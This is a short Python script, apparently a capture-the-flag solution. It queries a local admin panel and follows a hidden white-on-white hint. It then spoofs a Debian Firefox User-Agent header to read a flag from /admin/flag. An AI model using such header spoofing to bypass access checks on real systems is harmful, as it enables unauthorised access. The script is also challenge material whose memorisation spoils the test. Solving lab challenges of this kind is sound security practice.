import requests

# yes, default admin panel endpoint, very secure
r = requests.get(r"http://localhost:8000/admin")
# we can actually see white text on white bg, which told us to go this way
r = requests.get(r"http://localhost:8000/admin/flag")
# oh, we need to be Debian user, no problem
headers = {"User-Agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060313 Debian/1.5.dfsg+1.5.0.1-4 Firefox/1.5.0.1"}
r = requests.get(r"http://localhost:8000/admin/flag", headers=headers)

print(r.content.decode())